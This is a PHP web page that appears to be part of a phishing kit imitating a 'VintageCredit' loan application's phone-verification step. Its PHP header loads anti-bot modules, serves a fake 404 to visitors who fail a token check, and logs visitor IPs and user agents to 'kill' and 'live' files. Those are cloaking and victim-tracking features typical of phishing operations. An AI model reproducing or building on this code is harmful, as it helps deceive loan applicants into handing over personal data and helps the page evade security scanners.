<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['visitor']) ||
        !$_SESSION['visitor']
    ) {
        $comps->log(
            "../Guard/Audio/live.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
        );
        $_SESSION['visitor'] = 1;
    }

?>
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>VintageCredit - Loan Application</title>

    <link rel="shortcut icon" href="../../assets/images/vc-fav.png" type="image/x-icon">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/fontawesome.min.css">
    <link rel="stylesheet" href="../../assets/css/jquery-ui.css">
    <link rel="stylesheet" href="../../assets/css/plugin/nice-select.css">
    <link rel="stylesheet" href="../../assets/css/plugin/slick.css">
    <link rel="stylesheet" href="../../assets/css/arafat-font.css">
    <link rel="stylesheet" href="../../assets/css/plugin/animate.css">
    <link rel="stylesheet" href="../../assets/css/style.css">

</head>

<body>
    <!-- start preloader -->
    <div class="preloader" id="preloader"></div>
    <!-- end preloader -->

    <!-- Scroll To Top Start-->
    <a href="javascript:void(0)" class="scrollToTop"><i class="fas fa-angle-double-up"></i></a>
    <!-- Scroll To Top End -->

    <!-- header-section start -->
    <header class="header-section register login">
        <div class="overlay">
            <div class="container">
                <div class="row d-flex header-area">
                    <nav class="navbar navbar-expand-lg navbar-light">
                        <a class="navbar-brand" href="../../index.html">
                            <img src="../../assets/images/vc-logo-sm.png" class="logo" alt="logo">
                        </a>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!-- header-section end -->

    <!-- Verify Number In start -->
    <section class="sign-in-up verify-number">
        <div class="overlay pt-120 pb-120">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8">
                        <div class="form-content">
                            <div class="section-header">
                                <h5 class="sub-title">Give yourself the Bankio Edge</h5>
                                <h2 class="title">Varified Your Phone Number</h2>
                                <p>A 6 digit One Time Password (OTP) has been sent to your given email address which will expire in 15 minutes, after which you will need to resend the code.</p>
                            </div>
                            <div class="btn-back mt-60 d-flex align-items-center">
                                <a href="../../index.html" class="back-arrow"><img src="../../assets/images/icon/arrow-left.png"
                                        alt="icon">Back</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Verify Number In end -->

    <!--==================================================================-->
    <!-- <script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script> -->
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/jquery-ui.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script src="../../assets/js/fontawesome.js"></script>
    <script src="../../assets/js/plugin/slick.js"></script>
    <script src="../../assets/js/plugin/waypoint.min.js"></script>
    <script src="../../assets/js/plugin/counter.js"></script>
    <script src="../../assets/js/plugin/jquery.nice-select.min.js"></script>
    <script src="../../assets/js/plugin/wow.min.js"></script>
    <script src="../../assets/js/plugin/plugin.js"></script>
    <script src="../../assets/js/main.js"></script>
</body>

</html>